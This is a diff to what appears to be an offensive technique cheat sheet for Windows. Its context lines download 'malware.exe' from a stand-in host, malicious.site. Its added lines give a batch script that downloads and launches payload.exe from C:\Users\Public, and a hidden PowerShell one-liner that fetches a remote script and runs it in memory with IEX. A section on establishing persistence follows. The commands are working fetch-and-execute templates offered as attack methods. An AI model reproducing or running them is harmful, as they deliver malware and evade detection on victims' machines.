@@ -190,6 +190,18 @@ curl.exe https://malicious.site/file.exe -o malware.exe
 Invoke-WebRequest -Uri 'https://malicious.site/file.exe' -OutFile 'malware.exe'
 ```
 
+Using a script:
+```powershell
+@echo off
+powershell -Command "Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe"
+start C:\Users\Public\payload.exe
+```
+
+Fileless execution:
+```powershell
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
+```
+
 ### Establish persistence
 
 Create a new user
